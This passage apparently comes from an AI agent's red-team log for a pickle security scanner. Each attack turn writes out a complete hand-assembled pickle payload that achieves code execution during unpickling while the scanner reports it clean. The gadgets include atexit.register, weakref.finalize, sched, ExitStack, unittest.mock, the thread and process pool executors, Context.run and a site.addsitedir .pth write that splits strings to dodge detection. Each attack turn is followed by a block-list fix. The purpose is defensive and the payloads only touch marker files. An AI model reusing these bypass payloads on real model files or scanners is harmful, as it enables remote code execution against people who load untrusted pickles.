- `itertools.groupby` is absent from `DANGEROUS_GLOBALS`; only
  `itertools.dropwhile`, `itertools.filterfalse`, `itertools.starmap`, and
  `itertools.takewhile` are currently listed.
- The payload uses only currently clean globals: `builtins.tuple`,
  `itertools.groupby`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is another lazy arbitrary-call sink that can be forced
by a benign builtin. The narrow next block is a sorted `DANGEROUS_GLOBALS`
entry for `("itertools", "groupby")`, plus a manual-pickle oracle regression
that proves scan-time detection before unpickle-time marker creation.

## Turn 28 - Block `itertools.groupby`

Blocking plan:

- Add `("itertools", "groupby")` to the sorted Rust `DANGEROUS_GLOBALS`
  table. `tuple` stays allowed because the arbitrary-call sink is `groupby`;
  `tuple` only forces iteration.
- Add portable policy coverage for raw `GLOBAL itertools groupby` reductions.
- Add a CPython oracle regression that manually builds
  `tuple(itertools.groupby([marker], pathlib.Path.touch))`, verifies scanner
  detection, then verifies the marker file appears only during unpickle.

Performance note: the fix adds one tuple to a sorted static table checked with
binary search. It does not add iterable-flow analysis or broader string
scanning.

## Turn 29 - `itertools.accumulate` binary-function call gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


marker = Path("/tmp/ma_itertools_accumulate_tuple_marker")
payload = b"".join(
    [
        b"\x80\x04",
        s("builtins"),
        s("tuple"),
        b"\x93",
        s("itertools"),
        s("accumulate"),
        b"\x93",
        b"]",
        s("pathlib"),
        s("PosixPath"),
        b"\x93(",
        s("/"),
        s("tmp"),
        s("ma_itertools_accumulate_tuple_marker"),
        b"tRa",
        s("x"),
        b"a",
        s("pathlib"),
        s("Path.write_text"),
        b"\x93",
        b"\x86R",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
  `notices=[]`
- Unpickle result: creates `/tmp/ma_itertools_accumulate_tuple_marker` with
  content `x` and returns
  `(PosixPath("/tmp/ma_itertools_accumulate_tuple_marker"), 1)`
- RCE mechanism: the pickle constructs
  `itertools.accumulate([marker, "x"], pathlib.Path.write_text)`, then
  immediately calls `tuple(...)` on that accumulate object. `accumulate()`
  stores an attacker-selected binary function and iterable inputs, while
  `tuple()` forces iteration during unpickling, invoking the function with
  attacker-controlled arguments. `Path.write_text()` writes the marker file and
  returns the number of characters written.

Why the scanner missed it:

- `itertools.accumulate` is absent from `DANGEROUS_GLOBALS`; only
  `itertools.dropwhile`, `itertools.filterfalse`, `itertools.groupby`,
  `itertools.starmap`, and `itertools.takewhile` are currently listed.
- The payload uses only currently clean globals: `builtins.tuple`,
  `itertools.accumulate`, `pathlib.Path.write_text`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is a lazy arbitrary binary-call sink that can be forced
by a benign builtin. The narrow next block is a sorted `DANGEROUS_GLOBALS`
entry for `("itertools", "accumulate")`, plus a manual-pickle oracle
regression that proves scan-time detection before unpickle-time marker
creation.

## Turn 30 - Block `itertools.accumulate`

Blocking plan:

- Add `("itertools", "accumulate")` to the sorted Rust `DANGEROUS_GLOBALS`
  table. `tuple` stays allowed because the arbitrary-call sink is
  `accumulate`; `tuple` only forces iteration.
- Add portable policy coverage for raw `GLOBAL itertools accumulate`
  reductions.
- Add a CPython oracle regression that manually builds
  `tuple(itertools.accumulate([marker, "x"], pathlib.Path.write_text))`,
  verifies scanner detection, then verifies the marker file appears only
  during unpickle.

Performance note: the fix adds one tuple to a sorted static table checked with
binary search. It does not add iterable-flow analysis or broader string
scanning.

## Turn 31 - `atexit.register` exit-time callback gap

Goal: produce a more aggressive RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_atexit_register_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("atexit", "register"),
        sg("pathlib", "Path.touch"),
        sg("pathlib", "PosixPath"),
        b"(",
        s("/"),
        s("tmp"),
        s("ma_atexit_register_marker"),
        b"tR",
        b"\x86R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`
- Scanner import references:
  `atexit.register`, `pathlib.Path.touch`, and `pathlib.PosixPath`, all with
  `is_dangerous=False`
- Unpickle result: registers `pathlib.Path.touch(marker)` as an exit handler
  without creating the marker immediately
- Exit-time result: when Python runs exit handlers, the registered callback
  creates `/tmp/ma_atexit_register_marker`
- RCE mechanism: `atexit.register()` stores an attacker-selected callable and
  attacker-controlled arguments for execution at interpreter shutdown. The
  unpickle operation arms the callback inside the host process, so the payload
  can survive a clean deserialization path and execute later when the process
  exits.

Why the scanner missed it:

- `atexit` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The payload uses only currently clean globals: `atexit.register`,
  `pathlib.Path.touch`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is a delayed arbitrary-call sink, not a parsing miss.
The narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
`("atexit", "register")`, plus a regression that verifies scanner detection
before proving that the registered callback fires at exit. The hot path remains
a static policy lookup with no callback-flow simulation.

## Turn 32 - Block `atexit.register`

Blocking plan:

- Add `("atexit", "register")` to the sorted Rust `DANGEROUS_GLOBALS` table.
  `pathlib.Path.touch` stays allowed because the arbitrary-call sink is
  `atexit.register`; the callback is attacker-selected data passed to that
  sink.
- Add portable policy coverage for raw `GLOBAL atexit register` reductions so
  detection does not depend on executing the stdlib function.
- Add a CPython oracle regression that manually builds
  `atexit.register(pathlib.Path.touch, marker)`, verifies scanner detection,
  then runs the payload in a child Python process and proves the marker appears
  when interpreter exit handlers fire.

Performance note: the fix adds one tuple to a sorted static table checked with
binary search. It does not add exit-handler simulation, callback-flow analysis,
or broader string scanning.

## Turn 33 - `weakref.finalize` reclaim-time callback gap

Goal: produce another aggressive RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_weakref_finalize_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("weakref", "finalize"),
        sg("collections", "UserList"),
        b")R",
        sg("pathlib", "Path.touch"),
        sg("pathlib", "PosixPath"),
        b"(",
        s("/"),
        s("tmp"),
        s("ma_weakref_finalize_marker"),
        b"tR",
        b"\x87R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`
- Scanner import references:
  `weakref.finalize`, `collections.UserList`, `pathlib.Path.touch`, and
  `pathlib.PosixPath`, all with `is_dangerous=False`
- Unpickle result: creates `/tmp/ma_weakref_finalize_marker` before
  `pickle.loads()` returns and returns a dead `weakref.finalize` object
- RCE mechanism: `weakref.finalize(obj, func, *args)` stores an
  attacker-selected callback and attacker-controlled arguments that execute
  when `obj` is reclaimed. The pickle constructs a temporary
  `collections.UserList()` object as the watched object, passes
  `pathlib.Path.touch(marker)` as the finalizer callback, and does not preserve
  any other strong reference to the watched object. CPython reclaims the object
  during unpickling, so the finalizer callback fires immediately.

Why the scanner missed it:

- `weakref` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The payload uses only currently clean globals: `weakref.finalize`,
  `collections.UserList`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is another arbitrary-callback sink, but the trigger is
object reclamation rather than explicit iteration or interpreter shutdown. The
narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
`("weakref", "finalize")`, plus a regression that proves the callback executes
before `pickle.loads()` returns. The hot path remains a static policy lookup.

## Turn 34 - Block `weakref.finalize`

Blocking plan:

- Add `("weakref", "finalize")` to the sorted Rust `DANGEROUS_GLOBALS` table.
  `collections.UserList` and `pathlib.Path.touch` stay allowed because
  `weakref.finalize` is the arbitrary-callback sink that wires the watched
  object, callback, and attacker-controlled callback arguments together.
- Add portable policy coverage for raw `GLOBAL weakref finalize` reductions so
  detection does not depend on object-reclamation timing.
- Add a CPython oracle regression that manually builds
  `weakref.finalize(collections.UserList(), pathlib.Path.touch, marker)`,
  verifies scanner detection, then proves the marker appears before
  `pickle.loads()` returns.

Performance note: the fix adds one tuple to a sorted static table checked with
binary search. It does not add lifetime simulation, weakref-specific stack
analysis, or broader callback-flow tracking.

## Turn 35 - `sched.scheduler` queued-callback dispatch gap

Goal: produce another immediate RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_sched_scheduler_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("sched", "scheduler"),
        b")R\x94",
        sg("sched", "scheduler.enter"),
        b"(",
        b"h\x00",
        b"K\x00",
        b"K\x00",
        sg("pathlib", "Path.touch"),
        sg("pathlib", "PosixPath"),
        b"(",
        s("/"),
        s("tmp"),
        s("ma_sched_scheduler_marker"),
        b"tR",
        b"\x85",
        b"tR0",
        sg("sched", "scheduler.run"),
        b"h\x00",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`
- Scanner import references:
  `sched.scheduler`, `sched.scheduler.enter`, `pathlib.Path.touch`,
  `pathlib.PosixPath`, and `sched.scheduler.run`, all with
  `is_dangerous=False`
- Unpickle result: creates `/tmp/ma_sched_scheduler_marker` before
  `pickle.loads()` returns and returns `None`
- RCE mechanism: the pickle constructs a `sched.scheduler()` object, memoizes
  it, calls `scheduler.enter(0, 0, pathlib.Path.touch, (marker,))` to queue an
  attacker-selected callback with attacker-controlled arguments, discards the
  returned event, then calls `scheduler.run()` on the same memoized scheduler.
  A zero-delay event is due immediately, so `run()` dispatches the callback
  during unpickling.

Why the scanner missed it:

- `sched` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The payload uses only currently clean globals: `sched.scheduler`,
  `sched.scheduler.enter`, `sched.scheduler.run`, `pathlib.Path.touch`, and
  `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is a scheduler callback dispatch sink, not an opcode
parser miss. The focused next block should add sorted `DANGEROUS_GLOBALS`
entries for `("sched", "scheduler.enter")`, `("sched", "scheduler.enterabs")`,
and `("sched", "scheduler.run")`, plus a manual-pickle oracle regression for
the memoized scheduler proof. The hot path remains static policy lookup.

## Turn 36 - Block `sched.scheduler` queued callbacks

Blocking plan:

- Add `("sched", "scheduler.enter")`, `("sched", "scheduler.enterabs")`, and
  `("sched", "scheduler.run")` to the sorted Rust `DANGEROUS_GLOBALS` table.
  `sched.scheduler` itself stays allowed because it only creates the scheduler;
  `enter`/`enterabs` wire attacker-selected callbacks and `run` dispatches
  queued callbacks.
- Add portable policy coverage for all three raw global reductions so
  detection does not depend on callback timing.
- Add a CPython oracle regression that manually builds the memoized scheduler
  payload, verifies scanner detection for `scheduler.enter` and
  `scheduler.run`, then proves the queued callback creates the marker during
  `pickle.loads()`.

Performance note: the fix adds three tuples to a sorted static table checked
with binary search. It does not add scheduler state modeling, event queue
simulation, or broader callback-flow tracking.

## Turn 37 - `contextlib.ExitStack` cleanup-callback dispatch gap

Goal: produce another immediate RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_contextlib_exitstack_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("contextlib", "ExitStack"),
        b")R\x94",
        sg("contextlib", "ExitStack.callback"),
        b"(",
        b"h\x00",
        sg("pathlib", "Path.touch"),
        sg("pathlib", "PosixPath"),
        b"(",
        s("/"),
        s("tmp"),
        s("ma_contextlib_exitstack_marker"),
        b"tR",
        b"tR0",
        sg("contextlib", "ExitStack.close"),
        b"h\x00",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`
- Scanner import references:
  `contextlib.ExitStack`, `contextlib.ExitStack.callback`,
  `pathlib.Path.touch`, `pathlib.PosixPath`, and
  `contextlib.ExitStack.close`, all with `is_dangerous=False`
- Unpickle result: creates `/tmp/ma_contextlib_exitstack_marker` before
  `pickle.loads()` returns and returns `None`
- RCE mechanism: the pickle constructs a `contextlib.ExitStack()` object,
  memoizes it, calls
  `ExitStack.callback(stack, pathlib.Path.touch, marker)` to register an
  attacker-selected cleanup callback with attacker-controlled arguments,
  discards the returned callback, then calls `ExitStack.close(stack)` on the
  same memoized stack. `close()` dispatches the registered callback during
  unpickling.

Why the scanner missed it:

- `contextlib` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The payload uses only currently clean globals: `contextlib.ExitStack`,
  `contextlib.ExitStack.callback`, `contextlib.ExitStack.close`,
  `pathlib.Path.touch`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is another arbitrary-callback dispatch sink hidden
behind a cleanup abstraction. The focused next block should add sorted
`DANGEROUS_GLOBALS` entries for `("contextlib", "ExitStack.callback")`,
`("contextlib", "ExitStack.close")`, and
`("contextlib", "ExitStack.__exit__")`, plus a manual-pickle oracle regression
for the memoized `ExitStack` proof. The hot path remains static policy lookup.

## Turn 38 - Block `contextlib.ExitStack` cleanup callbacks

Blocking plan:

- Add `("contextlib", "ExitStack.callback")`,
  `("contextlib", "ExitStack.close")`, and
  `("contextlib", "ExitStack.__exit__")` to the sorted Rust
  `DANGEROUS_GLOBALS` table. `contextlib.ExitStack` itself stays allowed
  because it only creates the stack; `callback` wires attacker-selected cleanup
  callbacks and `close`/`__exit__` dispatch registered callbacks.
- Add portable policy coverage for all three raw global reductions so
  detection does not depend on cleanup timing.
- Add a CPython oracle regression that manually builds the memoized
  `ExitStack` payload, verifies scanner detection for `ExitStack.callback` and
  `ExitStack.close`, then proves the cleanup callback creates the marker during
  `pickle.loads()`.

Performance note: the fix adds three tuples to a sorted static table checked
with binary search. It does not add cleanup-stack state modeling,
context-manager simulation, or broader callback-flow tracking.

## Turn 39 - `unittest.mock.Mock` side-effect call-proxy gap

Goal: produce another immediate RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_unittest_mock_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("unittest.mock", "Mock"),
        b"(",
        b"N",
        sg("pathlib", "Path.touch"),
        b"tR\x94",
        b"h\x00",
        sg("pathlib", "PosixPath"),
        b"(",
        s("/"),
        s("tmp"),
        s("ma_unittest_mock_marker"),
        b"tR",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`
- Scanner import references:
  `unittest.mock.Mock`, `pathlib.Path.touch`, and `pathlib.PosixPath`, all
  with `is_dangerous=False`
- Unpickle result: creates `/tmp/ma_unittest_mock_marker` before
  `pickle.loads()` returns and returns `None`
- RCE mechanism: the pickle constructs
  `unittest.mock.Mock(None, pathlib.Path.touch)`, using the second positional
  argument as the mock's `side_effect`. It memoizes the mock instance, then
  uses that memoized object directly as the `REDUCE` callable with `(marker,)`
  as arguments. Calling the mock dispatches the attacker-selected
  `side_effect`, so `pathlib.Path.touch(marker)` executes during unpickling.

Why the scanner missed it:

- `unittest.mock` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The payload avoids any `__call__` string literal by using the memoized mock
  object itself as the callable operand to `REDUCE`, so the suspicious
  magic-method string heuristic does not fire.
- The payload uses only currently clean globals: `unittest.mock.Mock`,
  `pathlib.Path.touch`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is a callable-proxy constructor sink: the dangerous
behavior is not a separate global method, but an object produced by
`unittest.mock.Mock` with attacker-controlled `side_effect`. The focused next
block should add sorted `DANGEROUS_GLOBALS` entries for
`("unittest.mock", "Mock")` and `("unittest.mock", "MagicMock")`, plus a
manual-pickle oracle regression for the memoized mock proof. The hot path
remains static policy lookup.

## Turn 40 - Block `unittest.mock` callable proxies

Blocking plan:

- Add `("unittest.mock", "Mock")` and `("unittest.mock", "MagicMock")` to the
  sorted Rust `DANGEROUS_GLOBALS` table. These constructors can produce
  callable proxy objects with attacker-controlled `side_effect`, so the
  dangerous callable may be a later stack object rather than a separate global
  method reference.
- Add portable policy coverage for both raw global reductions so detection does
  not depend on mock call timing.
- Add a CPython oracle regression that manually builds the memoized mock
  payload, verifies scanner detection for `Mock`, then proves the side-effect
  callback creates the marker during `pickle.loads()`.

Performance note: the fix adds two tuples to a sorted static table checked with
binary search. It does not add object-provenance tracking, side-effect
introspection, or broader callable-flow analysis.

## Turn 41 - `concurrent.futures.ThreadPoolExecutor` submitted-callback gap

Goal: produce another immediate RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_threadpool_executor_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("concurrent.futures", "ThreadPoolExecutor"),
        b")R\x94",
        sg("concurrent.futures", "ThreadPoolExecutor.submit"),
        b"(",
        b"h\x00",
        sg("pathlib", "Path.touch"),
        sg("pathlib", "PosixPath"),
        b"(",
        s("/"),
        s("tmp"),
        s("ma_threadpool_executor_marker"),
        b"tR",
        b"tR0",
        sg("concurrent.futures", "ThreadPoolExecutor.shutdown"),
        b"h\x00",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`
- Scanner import references:
  `concurrent.futures.ThreadPoolExecutor`,
  `concurrent.futures.ThreadPoolExecutor.submit`, `pathlib.Path.touch`,
  `pathlib.PosixPath`, and
  `concurrent.futures.ThreadPoolExecutor.shutdown`, all with
  `is_dangerous=False`
- Unpickle result: creates `/tmp/ma_threadpool_executor_marker` before
  `pickle.loads()` returns and returns `None`
- RCE mechanism: the pickle constructs a `ThreadPoolExecutor()`, memoizes it,
  calls `ThreadPoolExecutor.submit(executor, pathlib.Path.touch, marker)` to
  queue an attacker-selected callable with attacker-controlled arguments,
  discards the returned `Future`, then calls
  `ThreadPoolExecutor.shutdown(executor)`. The default `wait=True` waits for
  the queued worker task, so the callback executes during unpickling and the
  worker is cleaned up before `pickle.loads()` returns.

Why the scanner missed it:

- `concurrent.futures` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The payload uses only currently clean globals:
  `concurrent.futures.ThreadPoolExecutor`,
  `concurrent.futures.ThreadPoolExecutor.submit`,
  `concurrent.futures.ThreadPoolExecutor.shutdown`, `pathlib.Path.touch`, and
  `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is an executor callback submission sink. The focused
next block should add sorted `DANGEROUS_GLOBALS` entries for
`("concurrent.futures", "ThreadPoolExecutor.submit")`,
`("concurrent.futures", "ThreadPoolExecutor.map")`, and
`("concurrent.futures", "ThreadPoolExecutor.shutdown")`, plus a manual-pickle
oracle regression for the memoized executor proof. The hot path remains static
policy lookup.

## Turn 42 - Block `ThreadPoolExecutor` submitted callbacks

Blocking plan:

- Add `("concurrent.futures", "ThreadPoolExecutor.submit")`,
  `("concurrent.futures", "ThreadPoolExecutor.map")`, and
  `("concurrent.futures", "ThreadPoolExecutor.shutdown")` to the sorted Rust
  `DANGEROUS_GLOBALS` table. `ThreadPoolExecutor` itself stays allowed because
  it only creates the executor; `submit`/`map` wire attacker-selected callables
  and `shutdown(wait=True)` can force queued callbacks to complete before
  deserialization returns.
- Add portable policy coverage for all three raw global reductions so
  detection does not depend on thread scheduling.
- Add a CPython oracle regression that manually builds the memoized executor
  payload, verifies scanner detection for `ThreadPoolExecutor.submit` and
  `ThreadPoolExecutor.shutdown`, then proves the submitted callback creates the
  marker during `pickle.loads()`.

Performance note: the fix adds three tuples to a sorted static table checked
with binary search. It does not add thread-pool state modeling, future tracking,
or broader asynchronous callback-flow analysis.

## Turn 43 - `concurrent.futures.ProcessPoolExecutor` submitted-callback gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, with execution in a child
process.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_processpool_executor_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("concurrent.futures", "ProcessPoolExecutor"),
        b")R\x94",
        sg("concurrent.futures", "ProcessPoolExecutor.submit"),
        b"(",
        b"h\x00",
        sg("pathlib", "Path.touch"),
        sg("pathlib", "PosixPath"),
        b"(",
        s("/"),
        s("tmp"),
        s("ma_processpool_executor_marker"),
        b"tR",
        b"tR0",
        sg("concurrent.futures", "ProcessPoolExecutor.shutdown"),
        b"h\x00",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`
- Scanner import references:
  `concurrent.futures.ProcessPoolExecutor`,
  `concurrent.futures.ProcessPoolExecutor.submit`, `pathlib.Path.touch`,
  `pathlib.PosixPath`, and
  `concurrent.futures.ProcessPoolExecutor.shutdown`, all with
  `is_dangerous=False`
- Runtime proof: executing `pickle.loads(payload)` inside a normal guarded
  script (`if __name__ == "__main__":`) creates
  `/tmp/ma_processpool_executor_marker` before the guarded script returns
- RCE mechanism: the pickle constructs a `ProcessPoolExecutor()`, memoizes it,
  calls `ProcessPoolExecutor.submit(executor, pathlib.Path.touch, marker)` to
  queue an attacker-selected callable with attacker-controlled arguments in a
  child process, discards the returned `Future`, then calls
  `ProcessPoolExecutor.shutdown(executor)`. The default `wait=True` waits for
  the queued child-process task, so the callback executes during unpickling and
  the process pool is cleaned up before `pickle.loads()` returns.

Why the scanner missed it:

- The prior block covered `ThreadPoolExecutor` methods only; corresponding
  `ProcessPoolExecutor` methods are absent from `DANGEROUS_GLOBALS`.
- `concurrent.futures` is still absent from `DANGEROUS_WILDCARD_MODULES`.
- The payload uses only currently clean globals:
  `concurrent.futures.ProcessPoolExecutor`,
  `concurrent.futures.ProcessPoolExecutor.submit`,
  `concurrent.futures.ProcessPoolExecutor.shutdown`, `pathlib.Path.touch`, and
  `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is the process-backed sibling of the thread-pool
callback submission sink. The focused next block should add sorted
`DANGEROUS_GLOBALS` entries for
`("concurrent.futures", "ProcessPoolExecutor.submit")`,
`("concurrent.futures", "ProcessPoolExecutor.map")`, and
`("concurrent.futures", "ProcessPoolExecutor.shutdown")`, plus a regression
that verifies scanner detection and proves child-process execution from a
guarded subprocess. The hot path remains static policy lookup.

## Turn 44 - Block `ProcessPoolExecutor` submitted callbacks

Blocking plan:

- Add `("concurrent.futures", "ProcessPoolExecutor.submit")`,
  `("concurrent.futures", "ProcessPoolExecutor.map")`, and
  `("concurrent.futures", "ProcessPoolExecutor.shutdown")` to the sorted Rust
  `DANGEROUS_GLOBALS` table. `ProcessPoolExecutor` itself stays allowed
  because it only creates the executor; `submit`/`map` wire attacker-selected
  callables into child processes and `shutdown(wait=True)` can force queued
  callbacks to complete before deserialization returns.
- Add portable policy coverage for all three raw global reductions so
  detection does not depend on process scheduling.
- Add a CPython oracle regression that manually builds the memoized executor
  payload, verifies scanner detection for `ProcessPoolExecutor.submit` and
  `ProcessPoolExecutor.shutdown`, then proves child-process execution from a
  guarded subprocess.

Performance note: the fix adds three tuples to a sorted static table checked
with binary search. It does not add process-pool state modeling, future
tracking, or broader asynchronous callback-flow analysis.

## Turn 45 - `contextvars.Context.run` arbitrary-callback gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using a synchronous callback
runner outside the already blocked executor/scheduler families.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_contextvars_context_run_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("contextvars", "Context"),
        b")R\x940",
        sg("contextvars", "Context.run"),
        b"(",
        b"h\x00",
        sg("pathlib", "Path.touch"),
        sg("pathlib", "PosixPath"),
        b"(",
        s("/"),
        s("tmp"),
        s("ma_contextvars_context_run_marker"),
        b"tR",
        b"tR.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=151`, `bytes_total=151`, `opcode_count=28`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `contextvars.Context`,
  `contextvars.Context.run`, `pathlib.Path.touch`, and
  `pathlib.PosixPath`, all with `is_dangerous=False`
- Unpickle result: creates `/tmp/ma_contextvars_context_run_marker` before
  `pickle.loads()` returns and returns `None`
- RCE mechanism: the pickle constructs a fresh `contextvars.Context()`,
  memoizes it, pops the construction result to keep the stack tidy, then calls
  `Context.run(context, pathlib.Path.touch, marker)`. `Context.run` executes
  the attacker-selected callable synchronously with attacker-controlled
  arguments during deserialization.

Why the scanner missed it:

- `contextvars` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The payload uses only currently clean globals: `contextvars.Context`,
  `contextvars.Context.run`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.
- The dangerous callback is passed as an argument to a clean-looking descriptor
  method; the scanner only flags the outer `REDUCE` callable if that outer
  callable is already policy-listed.

Performance note: this is a compact synchronous callback-dispatch sink. The
focused next block should add a sorted `DANGEROUS_GLOBALS` entry for
`("contextvars", "Context.run")`, plus a manual-pickle oracle regression for
the memoized `Context` proof. The hot path remains static policy lookup.

## Turn 46 - Block `contextvars.Context.run` callbacks

Blocking plan:

- Add `("contextvars", "Context.run")` to the sorted Rust
  `DANGEROUS_GLOBALS` table. `contextvars.Context` itself stays allowed because
  it only creates an execution context; `Context.run` is the arbitrary-callback
  dispatcher that invokes attacker-selected callables synchronously.
- Add portable policy coverage for a raw `contextvars.Context.run` reduction
  so detection does not depend on the specific manual oracle shape.
- Add a CPython oracle regression that manually builds the memoized
  `Context.run(context, pathlib.Path.touch, marker)` payload, verifies scanner
  detection for `Context.run`, then proves the callback creates the marker
  during `pickle.loads()`.

Performance note: the fix adds one tuple to a sorted static table checked with
binary search. It does not add callback-flow tracking, context object state
modeling, or descriptor-specific execution simulation.

## Turn 47 - `site.addsitedir` `.pth` execution gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using stdlib site-directory
processing rather than an obvious process-spawn or callback API.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_site_addsitedir_marker")
pth = Path("/tmp/ma_site_addsitedir_exec.pth")
content_parts = [
    "im",
    "port pathlib; pathlib.Path(",
    repr(str(marker)),
    ").touch()\n",
]
payload = b"".join(
    [
        b"\x80\x04",
        sg("pathlib", "PosixPath"),
        b"(",
        s("/"),
        s("tmp"),
        s("ma_site_addsitedir_exec.pth"),
        b"tR\x940",
        sg("builtins", "str.join"),
        b"(",
        s(""),
        b"(",
        *(s(part) for part in content_parts),
        b"ttR\x940",
        sg("pathlib", "Path.write_text"),
        b"(h\x00h\x01tR0",
        sg("site", "addsitedir"),
        s("/tmp"),
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=237`, `bytes_total=237`, `opcode_count=43`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
